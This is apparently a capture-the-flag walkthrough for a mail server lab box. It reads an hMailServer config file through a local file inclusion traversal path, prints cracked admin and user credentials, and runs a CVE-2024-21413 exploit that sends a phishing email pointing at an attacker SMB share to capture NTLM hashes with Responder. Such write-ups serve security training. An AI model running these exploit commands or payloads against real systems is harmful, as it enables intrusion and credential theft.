# hMailServer - hMailServer.ini config file

## Reading hMailServer admin password via LFI

```
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
```

**Admin password found via LFI:** `../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini`

[image]

### Cracking AdministratorPassword

```
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
```

[image]

## CVE-2024-21413

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender zetr0@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.2\share\sploit" --subject "Check this out as soon as possible"

responder -I tun0
```

[image]

**Found Maya's credentials.**

### Cracking NetNTLMv2

```
Credentials
maya:m4y4ngs4ri
```

[image]

## Shell as administrator

**CVE-2023-2255 - LibreOffice**
